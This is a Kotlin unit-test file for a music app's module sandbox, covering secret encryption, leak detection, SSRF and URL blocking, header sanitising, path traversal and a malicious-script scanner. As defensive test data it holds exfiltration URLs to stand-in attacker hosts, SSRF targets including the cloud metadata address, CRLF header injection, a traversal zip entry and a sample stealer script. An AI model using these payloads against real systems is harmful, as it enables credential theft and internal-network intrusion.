package com.mochyy.mochymusic.modules.security

import com.mochyy.mochymusic.module.HttpRequest
import com.mochyy.mochymusic.module.MatchedTrack
import com.mochyy.mochymusic.module.SourceStream
import com.mochyy.mochymusic.module.StreamFormat
import com.mochyy.mochymusic.utils.SecretVault
import okhttp3.OkHttpClient
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import java.io.ByteArrayOutputStream
import java.io.File
import java.net.InetAddress
import java.net.URLEncoder
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.io.encoding.Base64
import kotlin.io.encoding.ExperimentalEncodingApi

class ModuleSecurityTest {

    @Before
    fun setUp() {
        SecretVault.useTestKey(ByteArray(32) { (it * 7 + 3).toByte() })
        SecretGuard.clear("test_yt")
        SecretGuard.clear("test_webdav")
        SecretGuard.registerBlockedUrl("test_webdav_host", null)
    }

    @After
    fun tearDown() {
        SecretVault.useTestKey(null)
        SecretGuard.clear("test_yt")
        SecretGuard.clear("test_webdav")
        SecretGuard.registerBlockedUrl("test_webdav_host", null)
    }

    @Test
    fun vaultDomainIsolationAndTamperCheck() {
        val sealed = SecretVault.seal("super-secret-webdav-pass", SecretVault.CloudBackupDomain)
        assertTrue(sealed.startsWith("enc2:"))
        assertFalse(SecretVault.needsUpgrade(sealed))
        assertEquals("super-secret-webdav-pass", SecretVault.open(sealed, SecretVault.CloudBackupDomain))
        // ciphertext moved to another domain must fail to open
        assertNull(SecretVault.open(sealed, "module:evil"))
        // flipped byte must fail gcm auth
        val tampered = sealed.dropLast(1) + if (sealed.last() == 'A') 'B' else 'A'
        assertNull(SecretVault.open(tampered, SecretVault.CloudBackupDomain))
    }

    @OptIn(ExperimentalEncodingApi::class)
    @Test
    fun secretGuardCatchesRawEncodedAndCookieFragments() {
        val ytCookie = "PREF=tz=Asia.Jakarta; SAPISID=abcDEF1234567890/xyz; __Secure-3PSID=g.a000VerySecretTokenValue123"
        val webdavPass = "MySuperWebDavPass!2026"
        SecretGuard.register("test_yt", ytCookie)
        SecretGuard.register("test_webdav", webdavPass)
        SecretGuard.registerBlockedUrl("test_webdav_host", "https://dav.myhome.example/remote.php/dav")

        assertTrue(SecretGuard.containsSecret("https://evil.example/?c=abcDEF1234567890/xyz"))
        assertTrue(SecretGuard.containsSecret("https://evil.example/?c=${URLEncoder.encode(webdavPass, "UTF-8")}"))
        assertTrue(SecretGuard.containsSecret("payload=${Base64.encode(webdavPass.toByteArray())}"))
        assertTrue(SecretGuard.isBlockedHost("dav.myhome.example"))
        assertTrue(SecretGuard.isBlockedHost("sub.dav.myhome.example"))
        assertTrue(SecretGuard.isBlockedHost("mochy-module-feed.mochyy.workers.dev"))
        assertFalse(SecretGuard.isBlockedHost("api.github.com"))

        assertTrue(SecretGuard.looksLikeSecretProbe("innerTubeCookie"))
        assertTrue(SecretGuard.looksLikeSecretProbe("webdav_password"))
        assertTrue(SecretGuard.looksLikeSecretProbe("../settings"))
        assertFalse(SecretGuard.looksLikeSecretProbe("last_checked_at"))
    }

    @Test
    fun urlGuardBlocksSsrfAndSneakyIps() {
        val bad = listOf(
            "file:///data/data/com.mochyy.mochymusic/files/datastore/settings.preferences_pb",
            "content://com.android.contacts/data",
            "javascript:alert(1)",
            "intent://evil/#Intent;end",
            "http://localhost:8080/secret",
            "http://127.0.0.1:41821/library",
            "http://[::1]:8080/",
            "http://[::ffff:127.0.0.1]/",
            "http://0.0.0.0/",
            "http://10.0.0.1/admin",
            "http://172.16.5.2/dav",
            "http://192.168.1.1/router",
            "http://169.254.169.254/latest/meta-data/",
            "http://100.64.0.1/",
            "http://2130706433/",
            "http://0x7f000001/",
            "http://0177.0.0.1/",
            "https://user:pass@example.com/api",
            "https://mochy-module-feed.mochyy.workers.dev/modules",
        )
        bad.forEach { url ->
            assertFalse("expected blocked: $url", ModuleUrlGuard.isSafeRemoteUrl(url))
        }
        assertTrue(ModuleUrlGuard.isSafeRemoteUrl("https://api.monochrome.st/search?q=test"))
        assertTrue(ModuleUrlGuard.isBlockedAddress(InetAddress.getByName("127.0.0.1")))
        assertTrue(ModuleUrlGuard.isBlockedAddress(InetAddress.getByName("192.168.0.5")))
        assertFalse(ModuleUrlGuard.isBlockedAddress(InetAddress.getByName("1.1.1.1")))
    }

    @Test
    fun sandboxGreetsExfilAndLocalhostWithLol() {
        SecretGuard.register("test_webdav", "TopSecretWebDav999")
        val client = OkHttpClient()

        val exfil = ModuleUrlGuard.executeSandboxed(
            client,
            "shady-mod",
            HttpRequest("https://attacker.example/steal?p=TopSecretWebDav999"),
        )
        assertEquals(403, exfil.code)
        assertTrue(exfil.text.contains("lol"))

        val ssrf = ModuleUrlGuard.executeSandboxed(
            client,
            "shady-mod",
            HttpRequest("http://127.0.0.1:8080/internal"),
        )
        assertEquals(403, ssrf.code)
        assertTrue(ssrf.text.contains("lol"))
    }

    @Test
    fun streamSanitizerBlocksFileUrlsAndCrlfHeaders() {
        val matched = MatchedTrack("1", "Song", "Artist", null, 180_000, 0.9f)
        val evilFile = SourceStream("file:///etc/hosts", StreamFormat.Progressive, emptyMap(), null, "mod", "FLAC", matched)
        assertNull(ModuleUrlGuard.sanitizeStream(evilFile))

        SecretGuard.register("test_yt", "SAPISID=SecretCookie123456")
        val goodUrlWithBadHeaders = SourceStream(
            url = "https://cdn.example.com/song.flac",
            format = StreamFormat.Progressive,
            headers = mapOf(
                "Referer" to "https://cdn.example.com",
                "X-Evil" to "abc\r\nInjected: yes",
                "X-Steal" to "SecretCookie123456",
                "Host" to "spoofed.example",
            ),
            sourceLabel = "mod",
            qualityLabel = "FLAC",
            matched = matched,
        )
        val cleaned = ModuleUrlGuard.sanitizeStream(goodUrlWithBadHeaders)
        assertNotNull(cleaned)
        assertEquals(mapOf("Referer" to "https://cdn.example.com"), cleaned!!.headers)
    }

    @Test
    fun sanitizerPreventsPathTraversalAndBadIds() {
        assertNotEquals("..", ModuleSanitizer.safeSegment(".."))
        assertNotEquals(".", ModuleSanitizer.safeSegment("."))
        assertFalse(ModuleSanitizer.safeSegment("../../etc").contains(".."))

        val root = File(System.getProperty("java.io.tmpdir"), "mochy-sec-test")
        assertNull(ModuleSanitizer.safeChild(root, ".."))
        assertNull(ModuleSanitizer.safeChild(root, "a/../b"))
        assertNotNull(ModuleSanitizer.safeChild(root, "clean-mod", "1234"))

        assertFalse(ModuleSanitizer.isValidModuleId(".."))
        assertFalse(ModuleSanitizer.isValidModuleId("youtube"))
        assertFalse(ModuleSanitizer.isValidModuleId("a/b"))
        assertTrue(ModuleSanitizer.isValidModuleId("js.addons-1"))

        assertNull(ModuleSanitizer.safeNavArg("../settings"))
        assertNull(ModuleSanitizer.safeNavArg("abc?foo=bar"))
        assertEquals("PL123_abc-9", ModuleSanitizer.safeNavArg("PL123_abc-9"))
    }

    @Test
    fun scriptScannerBlocksShadyScriptsAndAllowsCleanOnes() {
        val clean = """
            export async function searchTracks(q) {
              const r = await fetch("https://music.example.com/search?q=" + encodeURIComponent(q));
              return r.json();
            }
        """.trimIndent().toByteArray()
        assertEquals(ScriptVerdict.Clean, ScriptSecurityScanner.scanBytes("good.js", clean).verdict)

        val warn = """
            export async function searchTracks(q) {
              const fn = eval("1+1");
              return fetch("http://plain.example.com/s?q=" + q);
            }
        """.trimIndent().toByteArray()
        assertEquals(ScriptVerdict.Warn, ScriptSecurityScanner.scanBytes("sketchy.js", warn).verdict)

        val evil = """
            export async function searchTracks() {
              const res = await fetch("http://127.0.0.1:41821/dump");
              const secret = "innerTubeCookie";
              return res.json();
            }
        """.trimIndent().toByteArray()
        val blocked = ScriptSecurityScanner.scanBytes("stealer.js", evil)
        assertEquals(ScriptVerdict.Blocked, blocked.verdict)
        assertTrue(blocked.findings.any { it.blocked })

        val badZip = ByteArrayOutputStream().apply {
            ZipOutputStream(this).use { z ->
                z.putNextEntry(ZipEntry("../evil.js"))
                z.write("console.log('hi')".toByteArray())
                z.closeEntry()
            }
        }.toByteArray()
        assertEquals(ScriptVerdict.Blocked, ScriptSecurityScanner.scanBytes("bad.zip", badZip).verdict)
    }

    @Test
    fun surfaceSessionClampsDimensionsAndRedactsErrors() {
        SecretGuard.register("test_webdav", "SuperSecretPass2026")
        assertEquals(640 to 480, com.mochyy.mochymusic.ui.player.styles.SurfaceSession.clampDimensions(99999, 99999))
        assertEquals(64 to 64, com.mochyy.mochymusic.ui.player.styles.SurfaceSession.clampDimensions(-5, 0))
        val error = com.mochyy.mochymusic.ui.player.styles.SurfaceSession.sanitizeError("failed reading SuperSecretPass2026\n\r\t" + "x".repeat(300))
        assertFalse(error.contains("SuperSecretPass2026"))
        assertFalse(error.contains("\n"))
        assertTrue(error.length <= 200)
    }
}
